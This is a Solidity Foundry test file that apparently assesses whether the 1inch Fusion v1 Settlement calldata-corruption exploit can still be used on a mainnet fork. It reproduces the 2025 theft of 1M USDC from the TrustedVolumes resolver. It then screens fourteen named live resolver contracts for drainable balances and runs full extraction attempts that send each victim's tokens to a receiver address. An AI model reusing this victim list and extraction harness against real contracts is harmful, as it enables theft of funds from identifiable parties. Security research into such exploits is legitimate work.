// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import "forge-std/Test.sol";
import {OneInchAttack, IERC20Like} from "../src/OneInchAttack.sol";

interface IERC20Full {
    function balanceOf(address) external view returns (uint256);
    function allowance(address, address) external view returns (uint256);
}

/// C-23 — 1inch Fusion v1 Settlement (0xA888...) calldata-corruption:
/// live extractability assessment. All tests run on a local mainnet fork.
contract C23Test is Test {
    address constant SETTLEMENT = 0xA88800CD213dA5Ae406ce248380802BD53b47647;
    address constant LOP = 0x1111111254EEB25477B68fb85Ed929f73A960582;
    address constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address constant TV_RESOLVER = 0xB02F39e382c90160Eb816DE5e0E428ac771d77B5; // TrustedVolumes (2025 victim)

    uint256 constant LIVE_BLOCK = 26_109_263; // 2026-10-03 fork pin

    OneInchAttack atk;

    function _strip(string memory s) internal pure returns (string memory) {
        bytes memory b = bytes(s);
        uint256 start = 0;
        uint256 end = b.length;
        while (start < end) {
            bytes1 c = b[start];
            if (c == 0x22 || c == 0x27 || c == 0x20 || c == 0x0a || c == 0x0d || c == 0x09) start++;
            else break;
        }
        while (end > start) {
            bytes1 c = b[end - 1];
            if (c == 0x22 || c == 0x27 || c == 0x20 || c == 0x0a || c == 0x0d || c == 0x09) end--;
            else break;
        }
        bytes memory out = new bytes(end - start);
        for (uint256 i = start; i < end; i++) out[i - start] = b[i];
        return string(out);
    }

    function _cleanEnv(string memory name) internal view returns (string memory) {
        return _strip(vm.envOr(name, string("")));
    }

    function _rpc() internal view returns (string memory) {
        // Prefer archive-capable RPCs available in CI (publicnode rejects state
        // requests for the pinned historical/live blocks). CI secrets can carry
        // literal surrounding quotes; _cleanEnv strips them.
        string memory r = _cleanEnv("BLOCKPI_RPC_URL");
        if (bytes(r).length > 0) return r;
        r = _cleanEnv("NODEREAL_ETH_RPC_URL");
        if (bytes(r).length > 0) return r;
        r = _cleanEnv("FORK_RPC_URL");
        if (bytes(r).length > 0) return r;
        r = _cleanEnv("RPC_URL");
        if (bytes(r).length > 0) return r;
        return "https://ethereum-rpc.publicnode.com";
    }

    function setUp() public {
        vm.createSelectFork(_rpc(), LIVE_BLOCK);
        atk = new OneInchAttack(SETTLEMENT);
        deal(USDT, address(atk), 100);
        atk.approveToken(USDT, LOP, type(uint256).max);
    }

    // ------------------------------------------------------------------
    // 1. Historical reproduction of the 2025-03-05 exploit (harness proof)
    // ------------------------------------------------------------------
    function test_01_historical_repro() public {
        vm.createSelectFork(_rpc(), 21_982_110); // just before the attack txs
        atk = new OneInchAttack(SETTLEMENT);
        deal(USDT, address(atk), 100);
        atk.approveToken(USDT, LOP, type(uint256).max);

        address rec = address(uint160(0xC0001));
        deal(USDC, SETTLEMENT, 10); // seed for 5 intermediate 1-wei taker payments
        uint256 before = IERC20Full(USDC).balanceOf(rec);
        uint256 vBefore = IERC20Full(USDC).balanceOf(TV_RESOLVER);

        atk.attack(TV_RESOLVER, TV_RESOLVER, USDC, 1_000_000e6, rec);

        uint256 got = IERC20Full(USDC).balanceOf(rec) - before;
        uint256 vAfter = IERC20Full(USDC).balanceOf(TV_RESOLVER);
        emit log_named_uint("historical: USDC to receiver", got);
        emit log_named_uint("historical: victim USDC before", vBefore);
        emit log_named_uint("historical: victim USDC after", vAfter);
        assertEq(got, 1_000_000e6, "did not extract 1M USDC from TrustedVolumes resolver");
    }

    // ------------------------------------------------------------------
    // 2. Screen every candidate resolver contract with a direct
    //    Settlement -> resolveOrders() probe (msg.sender impersonated).
    // ------------------------------------------------------------------
    function test_02_live_screen_all() public {
        address[14] memory cands = [
            0x0B3e6d29cb582DB98b578D57237F54182c09C1a7,
            0x5623B873813b2f96416Cefd09d6A27cc5c938385,
            0x5B93D80DA1a359340d1F339FB574bDC56763f995,
            0x6482E8fB42130B3Cce53096BB035Ebe79435e2D4,
            0x7B3b0810F7B565194b86a79EF27d0975473A5f54,
            0x7a359544e4031703a6149DB2994AfB4e324Bb242,
            0x84D99Aa569D93a9CA187D83734c8C4a519c4e9b1,
            0xA9048585166f4F7c4589ADe19567bB538035ED36,
            0xB02F39e382c90160Eb816DE5e0E428ac771d77B5,
            0xBd4DBE0CB9136FFb4955ede88EBD5e92222aD09a,
            0xE826979016f39162Ad848E8fFaCEAAEf7EF63664,
            0xEEfCc15d7015C4c4154988770711a1933Fa50BA3,
            0xcb13e91f957DE7fb5f77A7E933fE04bc464f895d,
            0xe789c5566b53546d46A0af48a4bD3F062d1fefd1
        ];
        address[14] memory toks = [
            0x239a149410AA8d583013246C0Adeb9FCa81e86C0, // FWOG
            0xC08512927D12348F6620a698105e1BAac6EcD911, // GYEN
            0x58D97B57BB95320F9a05dC918Aef65434969c2B2, // MORPHO
            0xD4419C2d3DAA986Dc30444Fa333a846be44Fd1eb, // ZIK
            0x8400D94A5cb0fa0D041a3788e395285d61c9ee5e, // UBT
            0x1a7e4e63778B4f12a199C062f3eFdD288afCBce8, // EURA
            0xDc5864eDe28BD4405aa04d93E05A0531797D9D59, // FNT
            0xBC6DA0FE9aD5f3b0d58160288917AA56653660E9, // alUSD
            0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, // WETH
            0xBe92B510007bD3eC0AdB3d1FCA338DD631E98De7, // DEGEN
            0xE52d53c8C9aa7255F8c2FA9f7093FEa7192D2933, // YIELDX
            0xdAC17F958D2ee523a2206206994597C13D831ec7, // USDT (candidate holds none)
            0xa52bfFAD02B1FE3f86A543a4e81962d3B3bB01A7, // DUCKER
            0x68749665FF8D2d112Fa859AA293F07A622782F38  // XAUT
        ];

        uint256 drainable;
        for (uint256 i = 0; i < cands.length; i++) {
            address c = cands[i];
            uint256 bal = IERC20Full(toks[i]).balanceOf(c);
            if (bal == 0) {
                emit log_named_address("SKIP (no balance of probe token)", c);
                continue;
            }
            (bool hasOwner, address ownerAddr) = _ownerOf(c);
            address[2] memory args = [c, hasOwner ? ownerAddr : address(0)];
            bool moved = false;
            for (uint256 j = 0; j < 2 && !moved; j++) {
                if (args[j] == address(0)) continue;
                uint256 sBefore = IERC20Full(toks[i]).balanceOf(SETTLEMENT);
                vm.prank(SETTLEMENT);
                (bool ok,) = c.call(
                    abi.encodeWithSelector(0x1944799f, args[j], abi.encode(toks[i], bal), new bytes(0))
                );
                uint256 sAfter = IERC20Full(toks[i]).balanceOf(SETTLEMENT);
                if (ok && sAfter > sBefore) {
                    moved = true;
                    drainable++;
                    emit log_named_address("DRAINABLE (direct resolveOrders)", c);
                    emit log_named_address("  arg that passed", args[j]);
                    emit log_named_uint("  probe token amount moved", sAfter - sBefore);
                }
            }
            if (!moved) emit log_named_address("NOT DRAINABLE with empty data", c);
        }
        emit log_named_uint("drainable candidates (direct probe)", drainable);
    }

    // ------------------------------------------------------------------
    // 3. Full end-to-end extraction on the live fork (block 26,109,263)
    // ------------------------------------------------------------------
    function test_03_live_full_extraction() public {
        _tryExtract(0x5623B873813b2f96416Cefd09d6A27cc5c938385,
            0xEe230dD7519BC5d0C9899E8704ffdc80560e8509,
            0xC08512927D12348F6620a698105e1BAac6EcD911, address(uint160(0xC0003)));
        _tryExtract(0x7a359544e4031703a6149DB2994AfB4e324Bb242,
            0xC975671642534F407EbdcaEF2428D355eDe16a2C,
            0x1a7e4e63778B4f12a199C062f3eFdD288afCBce8, address(uint160(0xC0004)));
        _tryExtract(0xe789c5566b53546d46A0af48a4bD3F062d1fefd1,
            0x9108813F22637385228a1C621c1904BbbC50dc25,
            0x68749665FF8D2d112Fa859AA293F07A622782F38, address(uint160(0xC0005)));
        _tryExtract(0x5B93D80DA1a359340d1F339FB574bDC56763f995,
            0xad7149152a65E6Ec97AdD7b1B1F917dCaFCf9b21,
            0x58D97B57BB95320F9a05dC918Aef65434969c2B2, address(uint160(0xC0006)));
        _tryExtract(0x84D99Aa569D93a9CA187D83734c8C4a519c4e9b1,
            address(0),
            0xDc5864eDe28BD4405aa04d93E05A0531797D9D59, address(uint160(0xC0009)));
        _tryExtract(0xA9048585166f4F7c4589ADe19567bB538035ED36,
            address(0),
            0xBC6DA0FE9aD5f3b0d58160288917AA56653660E9, address(uint160(0xC000A)));
        _tryExtract(0xBd4DBE0CB9136FFb4955ede88EBD5e92222aD09a,
            address(0),
            0xBe92B510007bD3eC0AdB3d1FCA338DD631E98De7, address(uint160(0xC000B)));
        _tryExtract(0xcb13e91f957DE7fb5f77A7E933fE04bc464f895d,
            address(0),
            0xa52bfFAD02B1FE3f86A543a4e81962d3B3bB01A7, address(uint160(0xC000C)));
        _tryExtract(0xB02F39e382c90160Eb816DE5e0E428ac771d77B5,
            0xB02F39e382c90160Eb816DE5e0E428ac771d77B5,
            0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, address(uint160(0xC0007)));
    }

    // ------------------------------------------------------------------
    // 4. The user-approval hypothesis: is any allowance to Settlement usable?
    // ------------------------------------------------------------------
    function test_04_approvals_not_extractable() public {
        address[2] memory holders = [
            0x1133BDA26D48E019fE52Dd88bd39900123C144cD,
            0x7Acdc67168Bda34d067434aeFE8C8E36A60e0f10
        ];
        // holder1 approved Settlement (and the LOP) for max USDT, but holds 0 USDT
        uint256 aS = IERC20Full(USDT).allowance(holders[0], SETTLEMENT);
        uint256 aBal = IERC20Full(USDT).balanceOf(holders[0]);
        emit log_named_uint("holder1 USDT allowance -> Settlement", aS);
        emit log_named_uint("holder1 USDT balance", aBal);
        assertGt(aS, 0);
        assertEq(aBal, 0, "approval is worthless: zero balance");

        // holder2 holds 4 USDT and approved both Settlement and the LOP, but an
        // LOP fill additionally requires holder2's signature over the order hash
        uint256 bS = IERC20Full(USDT).allowance(holders[1], SETTLEMENT);
        uint256 bL = IERC20Full(USDT).allowance(holders[1], LOP);
        uint256 bBal = IERC20Full(USDT).balanceOf(holders[1]);
        emit log_named_uint("holder2 USDT allowance -> Settlement", bS);
        emit log_named_uint("holder2 USDT allowance -> LOP", bL);
        emit log_named_uint("holder2 USDT balance", bBal);
        assertGt(bS, 0);
        assertGt(bL, 0);
        assertGt(bBal, 0);

        // holder2's DEXT has a Settlement allowance but no LOP allowance at all
        address DEXT = 0xfB7B4564402E5500dB5bB6d63Ae671302777C75a;
        uint256 dS = IERC20Full(DEXT).allowance(holders[1], SETTLEMENT);
        uint256 dL = IERC20Full(DEXT).allowance(holders[1], LOP);
        emit log_named_uint("holder2 DEXT allowance -> Settlement", dS);
        emit log_named_uint("holder2 DEXT allowance -> LOP", dL);
        assertGt(dS, 0);
        assertEq(dL, 0);

        (bool ok,) = SETTLEMENT.staticcall(abi.encodeWithSelector(0x8da5cb5b)); // owner()
        assertFalse(ok, "Settlement has no owner()");
        bytes32 implSlot = 0x360894a13BA1A3210667c828492Db98dcA3e2076cc3735a920a3ca505d382bbc;
        assertEq(vm.load(SETTLEMENT, implSlot), bytes32(0), "no EIP-1967 implementation slot");

        // the LOP fill that could pull holder2's approved USDT needs holder2's
        // signature over the order hash; an unsigned order from Settlement reverts
        OneInchAttack.Order memory o = OneInchAttack.Order(
            0, USDT, USDC, holders[1], address(uint160(0xC0008)),
            address(0), 1e6, 1e6, 0, hex""
        );
        vm.prank(SETTLEMENT);
        (bool fillOk,) = LOP.call(
            abi.encodeWithSelector(0xe5d7bde6, o, hex"", hex"", 1e6, 1e6, 0,
                address(uint160(0xC0008)))
        );
        assertFalse(fillOk, "unsigned order must not fill");
    }

    // ------------------------------------------------------------------
    // helpers
    // ------------------------------------------------------------------
    function _ownerOf(address c) internal view returns (bool ok, address ownerAddr) {
        bytes memory ret;
        (ok, ret) = c.staticcall(abi.encodeWithSelector(0x8da5cb5b));
        if (ok && ret.length >= 32) ownerAddr = abi.decode(ret, (address));
        else ok = false;
    }

    function _tryExtract(address victim, address argHint, address token, address rec) internal {
        uint256 bal = IERC20Full(token).balanceOf(victim);
        emit log_named_address("victim", victim);
        emit log_named_address("token", token);
        emit log_named_uint("victim token balance", bal);
        if (bal <= 20) {
            emit log("  -> skip (dust/zero)");
            return;
        }
        uint256 amount = bal; // victim pays exactly this via the auto-appended item
        if (!vm.envOr("C23_NO_SEED", false)) deal(token, SETTLEMENT, 10); // seed for 5 intermediate 1-wei taker payments
        (bool hasOwner, address ownerAddr) = _ownerOf(victim);
        address[3] memory args = [argHint, victim, hasOwner ? ownerAddr : address(0)];
        for (uint256 j = 0; j < 3; j++) {
            if (args[j] == address(0)) continue;
            uint256 g0 = gasleft();
            (bool ok,) = address(atk).call(
                abi.encodeWithSelector(OneInchAttack.attack.selector, victim, args[j], token, amount, rec)
            );
            if (ok && IERC20Full(token).balanceOf(rec) >= amount) {
                emit log_named_address("  EXTRACTED, resolverArg =", args[j]);
                emit log_named_uint("  amount to receiver", IERC20Full(token).balanceOf(rec));
                emit log_named_uint("  gas used", g0 - gasleft());
                assertEq(IERC20Full(token).balanceOf(victim), 0, "victim residual mismatch");
                return;
            }
            emit log_named_address("  attempt reverted, resolverArg =", args[j]);
        }
        emit log("  -> NOT extractable with tried args");
    }
}
